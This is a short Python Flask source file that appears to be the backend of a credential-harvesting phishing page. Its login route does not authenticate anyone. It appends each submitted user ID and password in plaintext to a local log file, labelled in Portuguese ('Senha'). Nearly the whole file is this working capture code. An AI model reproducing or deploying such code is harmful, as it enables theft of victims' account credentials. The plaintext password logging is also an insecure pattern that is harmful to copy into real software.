from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

@app.route('/')
def home():
	return render_template('home_page/index.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        userLoginId = request.form['userLoginId']
        password = request.form['password']
        
        with open('log.txt', 'a') as f:
            f.write(f'Email: {userLoginId} | Senha: {password}\n')
    return render_template('login/index.html')

if __name__ == '__main__':
	app.run()
